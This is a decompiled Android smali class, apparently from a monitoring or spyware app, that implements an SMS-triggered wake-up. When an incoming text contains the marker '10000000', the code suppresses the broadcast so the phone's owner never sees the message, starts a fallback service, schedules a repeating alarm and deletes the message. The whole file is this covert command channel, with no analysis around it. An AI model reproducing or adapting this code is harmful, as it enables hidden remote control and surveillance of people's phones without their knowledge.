.class public Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsStartupBroadcastReceiver.java"


# instance fields
.field protected final SMS_RECEIVED:Ljava/lang/String;

.field protected final WAKEUP_MARKER:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 31
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    .line 33
    iput-object v0, p0, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->SMS_RECEIVED:Ljava/lang/String;

    const-string v0, "10000000"

    .line 34
    iput-object v0, p0, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->WAKEUP_MARKER:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method protected deleteMessage(Landroid/content/Context;Ljava/lang/String;)V
    .locals 5

    const-string v0, ""

    .line 117
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x13

    if-ge v1, v2, :cond_0

    .line 118
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p1

    .line 119
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v1, "%s = \'%s\'"

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-string v4, "body"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object p2, v2, v3

    .line 120
    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p2

    const/4 v1, 0x0

    .line 118
    invoke-virtual {p1, v0, p2, v1}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    :cond_0
    return-void
.end method

.method protected extractBody(Landroid/content/Intent;)Ljava/lang/String;
    .locals 6

    .line 82
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    const/4 v0, 0x0

    if-nez p1, :cond_0

    return-object v0

    :cond_0
    const-string v1, "pdus"

    .line 88
    invoke-virtual {p1, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, [Ljava/lang/Object;

    if-nez p1, :cond_1

    return-object v0

    .line 94
    :cond_1
    array-length v1, p1

    new-array v1, v1, [Landroid/telephony/SmsMessage;

    const-string v2, ""

    const/4 v3, 0x0

    .line 97
    :goto_0
    array-length v4, p1

    if-ge v3, v4, :cond_3

    .line 98
    aget-object v4, p1, v3

    check-cast v4, [B

    invoke-static {v4}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v4

    aput-object v4, v1, v3

    .line 100
    aget-object v4, v1, v3

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_2

    .line 102
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_2
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_3
    if-eqz v2, :cond_4

    .line 107
    sget-object p1, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-virtual {v2, p1}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object p1

    return-object p1

    :cond_4
    return-object v0
.end method

.method protected log(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 40
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->process(Landroid/content/Context;Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 43
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method protected process(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    .line 49
    invoke-virtual {p0, p2}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->extractBody(Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    const-string p1, "SMS Body is null"

    .line 51
    invoke-virtual {p0, p1}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    return-void

    :cond_0
    const-string v1, "10000000"

    .line 58
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "(1/5) Intercepted SMS that contains the marker: 10000000"

    .line 59
    invoke-virtual {p0, v0}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    .line 61
    invoke-virtual {p0}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->abortBroadcast()V

    const-string v0, "(2/5) Broadcast aborted."

    .line 62
    invoke-virtual {p0, v0}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    .line 64
    new-instance v0, Landroid/content/Intent;

    const-string v1, "com.hp.vb.FALLBACK_START"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 65
    invoke-virtual {p1, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    const-string v0, "(3/5) Sent INTENT_FALLBACK_START"

    .line 66
    invoke-virtual {p0, v0}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    .line 68
    new-instance v0, Lcom/hp/vd/AlarmRoutine;

    new-instance v1, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v1}, Lcom/hp/vd/agent/Configuration;-><init>()V

    invoke-direct {v0, p1, p2, v1}, Lcom/hp/vd/AlarmRoutine;-><init>(Landroid/content/Context;Landroid/content/Intent;Lcom/hp/vd/agent/Configuration;)V

    .line 69
    invoke-virtual {v0}, Lcom/hp/vd/AlarmRoutine;->dispatchOnBoot()V

    const-string p2, "(4/5) Repeating alarm set up."

    .line 70
    invoke-virtual {p0, p2}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    const-string p2, "10000000"

    .line 72
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->deleteMessage(Landroid/content/Context;Ljava/lang/String;)V

    const-string p1, "(5/5) Sms (with marker) deleted."

    .line 73
    invoke-virtual {p0, p1}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    const-string p1, "SMS body does not contain the marker: 10000000"

    .line 76
    invoke-virtual {p0, p1}, Lcom/hp/vd/starter/SmsStartupBroadcastReceiver;->log(Ljava/lang/String;)V

    :goto_0
    return-void
.end method
